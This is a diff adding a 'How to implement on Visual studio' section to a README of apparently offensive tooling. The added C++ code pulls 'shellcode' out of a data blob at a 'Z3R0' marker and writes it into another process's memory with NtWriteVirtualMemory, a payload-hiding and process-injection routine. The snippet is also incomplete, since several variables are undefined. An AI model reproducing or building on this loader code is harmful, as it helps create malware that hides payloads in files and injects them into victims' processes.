@@ -38,3 +38,34 @@ Install dependencies:
 ```bash
 pip install pyfiglet
 ```
+
+## How to implement on Visual studio
+
+```cpp
+std::vector<char> extractShellcode(const char* data, size_t size, const char* marker = "Z3R0") {
+	if (!marker || strlen(marker) != 4) {
+		return {};
+	}
+
+	for (size_t i = 0; i < size - 8; ++i) {
+		if (data[i] == marker[0] &&
+			data[i + 1] == marker[1] &&
+			data[i + 2] == marker[2] &&
+			data[i + 3] == marker[3]) {
+
+			uint32_t len = *(uint32_t*)&data[i + 4];
+
+			if (i + 8 + len > size) {
+				return {};
+			}
+
+			return std::vector<char>(data + i + 8, data + i + 8 + len);
+		}
+	}
+
+	return {};
+}
+
+std::vector<char> buffer = extractShellcode(data, size, marker);
+NtWriteVirtualMemory(pi.hProcess, remoteAddr, buffer.data(), buffer.size(), NULL);
+```
